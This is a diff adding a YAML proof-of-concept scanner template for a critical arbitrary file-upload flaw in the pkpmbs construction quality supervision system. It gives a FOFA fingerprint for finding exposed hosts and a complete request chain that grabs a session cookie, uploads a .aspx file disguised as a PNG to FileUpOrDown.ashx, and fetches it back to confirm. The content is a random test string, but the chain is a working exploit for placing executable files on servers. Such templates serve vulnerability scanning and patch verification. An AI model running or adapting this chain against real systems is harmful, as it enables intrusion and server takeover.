@@ -1,0 +1,51 @@
+id: poc-yaml-pkpmbs-construction-engineering-quality-supervision-system-upload-file
+info:
+  name: pkpmbs 建设工程质量监督系统 文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: pkpmbs 建设工程质量监督系统
+  fofa: icon_hash="2001627082"
+variables:
+  filename: random_str(6)
+  content: random_str(32)
+requests:
+- method: GET
+  path: /Login.cshtml
+  expression: 'status_code == 200 &&
+
+    contains(headers,"ASP.NET_SessionId")
+
+    '
+  output:
+  - regex_match(headers,"ASP.NET_SessionId=(?P<t1>.*?);")
+- method: POST
+  path: /Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&&searchConfigName={{.filename}}.aspx
+  headers:
+    Cookie: ASP.NET_SessionId={{.t1}};
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP
+  data: '------WebKitFormBoundarybqACRhAMBHmQQAUP
+
+    Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
+
+    Content-Type: image/png
+
+
+    {{.content}}
+
+    ------WebKitFormBoundarybqACRhAMBHmQQAUP--
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,filename)
+
+    '
+- method: GET
+  path: /Excel/Templete/{{.filename}}.aspx
+  expression: 'status_code == 200 &&
+
+    contains(body,content)
+
+    '
+transport: http
